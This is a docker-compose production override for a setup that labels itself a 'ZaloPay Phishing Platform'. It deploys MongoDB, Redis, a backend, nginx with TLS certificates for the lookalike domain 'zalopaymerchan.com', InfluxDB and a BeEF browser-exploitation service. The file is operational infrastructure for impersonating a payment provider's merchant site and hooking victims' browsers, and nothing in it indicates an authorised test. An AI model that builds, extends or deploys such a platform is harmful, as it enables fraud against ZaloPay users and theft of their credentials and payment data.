version: '3.8'

# Production Override for ZaloPay Phishing Platform
# Use with: docker-compose -f docker-compose.yml -f docker-compose.production.yml up -d

services:
  # MongoDB Primary with authentication enabled
  mongodb-primary:
    command: mongod --replSet rs0 --bind_ip_all --auth --keyFile /data/mongodb-keyfile
    environment:
      MONGO_INITDB_ROOT_USERNAME: ${MONGODB_ROOT_USERNAME}
      MONGO_INITDB_ROOT_PASSWORD: ${MONGODB_ROOT_PASSWORD}
    volumes:
      - ./mongodb-keyfile:/data/mongodb-keyfile:ro
      - mongodb_primary_data:/data/db
      - mongodb_primary_config:/data/configdb
    restart: always

  # MongoDB Secondaries with authentication
  mongodb-secondary-1:
    command: mongod --replSet rs0 --bind_ip_all --auth --keyFile /data/mongodb-keyfile
    volumes:
      - ./mongodb-keyfile:/data/mongodb-keyfile:ro
      - mongodb_secondary1_data:/data/db
    restart: always

  mongodb-secondary-2:
    command: mongod --replSet rs0 --bind_ip_all --auth --keyFile /data/mongodb-keyfile
    volumes:
      - ./mongodb-keyfile:/data/mongodb-keyfile:ro
      - mongodb_secondary2_data:/data/db
    restart: always

  # Redis with password
  redis-primary:
    command: redis-server --requirepass ${REDIS_PASSWORD} --appendonly yes
    restart: always

  redis-replica:
    command: redis-server --replicaof redis-primary 6379 --masterauth ${REDIS_PASSWORD} --requirepass ${REDIS_PASSWORD}
    restart: always

  # Backend with production settings
  backend:
    environment:
      - ENVIRONMENT=production
      - DEBUG=false
      - LOG_LEVEL=INFO
    restart: always
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 2G
        reservations:
          cpus: '1.0'
          memory: 1G

  # Frontend with production nginx config
  frontend:
    restart: always

  # Nginx with SSL and production config
  nginx:
    volumes:
      - ./nginx/conf.d/production.conf:/etc/nginx/conf.d/default.conf:ro
      - ./certbot/conf:/etc/letsencrypt:ro
      - ./certbot/www:/var/www/certbot:ro
      - nginx_ssl:/etc/nginx/ssl
    restart: always
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 512M

  # Certbot for SSL certificate issuance and renewal
  certbot:
    image: certbot/certbot:latest
    volumes:
      - ./certbot/conf:/etc/letsencrypt
      - ./certbot/www:/var/www/certbot
      - nginx_ssl:/etc/nginx/ssl
    environment:
      - DOMAIN=zalopaymerchan.com
      - EMAIL=admin@zalopaymerchan.com
    entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew --webroot --webroot-path=/var/www/certbot --deploy-hook=\"nginx -s reload\"; sleep 12h & wait $${!}; done;'"
    restart: always
    depends_on:
      - nginx

  # InfluxDB with persistence
  influxdb:
    volumes:
      - influxdb_data:/var/lib/influxdb2
      - influxdb_config:/etc/influxdb2
    restart: always

  # BeEF with production settings
  beef:
    restart: always
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1G

volumes:
  mongodb_primary_data:
    driver: local
  mongodb_primary_config:
    driver: local
  mongodb_secondary1_data:
    driver: local
  mongodb_secondary2_data:
    driver: local
  influxdb_data:
    driver: local
  influxdb_config:
    driver: local
  nginx_ssl:
    driver: local

